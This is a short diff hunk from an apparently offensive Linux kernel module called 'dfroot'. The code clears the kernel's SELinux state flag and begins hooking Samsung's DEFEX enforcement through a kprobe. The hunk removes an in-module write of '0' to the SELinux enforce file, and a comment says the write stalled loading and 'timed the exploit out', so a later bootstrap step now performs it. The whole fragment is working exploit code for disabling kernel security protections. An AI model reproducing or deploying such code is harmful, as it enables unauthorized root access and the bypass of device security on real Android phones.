@@ -865,21 +865,10 @@ static int __nocfi __init dfroot_init(void)
     }
     WRITE_ONCE(*selinux_state, false);
     pr_info("dfroot: selinux_state byte0 cleared\n");
-    {
-        struct file *sf;
-        loff_t sfx_pos = 0;
-        static const char zero[] = "0";
-
-        sf = df_filp_open("/sys/fs/selinux/enforce", O_WRONLY, 0);
-        if (!IS_ERR(sf)) {
-            df_kernel_write(sf, zero, sizeof(zero) - 1, &sfx_pos);
-            filp_close(sf, NULL);
-            pr_info("dfroot: selinuxfs enforce -> 0\n");
-        } else {
-            pr_warn("dfroot: selinuxfs enforce open failed (%ld)\n",
-                    PTR_ERR(sf));
-        }
-    }
+    /* The selinuxfs coherence write does NOT belong here: a selinuxfs enforce
+     * write inside module_init stalled the whole load (v1.19, v1.42 - both
+     * timed the exploit out), probably the policy mutex against the exploit's
+     * own page-cache work.  bootstrap does it right after this module is up. */
 
     // Samsung
     defex_enforce_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
